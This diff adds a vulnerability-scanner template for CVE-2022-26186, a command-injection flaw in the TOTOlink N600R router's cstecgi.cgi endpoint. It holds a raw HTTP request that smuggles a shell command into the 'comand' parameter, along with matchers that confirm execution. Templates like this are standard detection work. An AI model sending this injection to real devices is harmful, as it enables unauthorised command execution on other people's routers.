@@ -1,0 +1,35 @@
+id: CVE-2022-26186
+
+info:
+  name: TOTOlink N600R Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    TOTOlink N600R exportOvpn interface /cgi-bin/cstecgi.cgi file comand parameter command execution vulnerability.
+    Attackers can use this vulnerability to execute arbitrary code on the server side, write backdoors, and obtain server permissions.
+  reference:
+    - https://doudoudedi.github.io/2022/02/21/TOTOLINK-N600R-Command-Injection/
+  classification:
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cve-id: CVE-2022-26186
+  tags: command-execution
+
+http:
+  - raw:
+      - |
+        POST /cgi-bin/cstecgi.cgi?exportOvpn=&type=user&comand=;ls${IFS}/;&filetype=gz HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/plain
+
+        aaaaa
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "can not open config file"
+          - "bin"
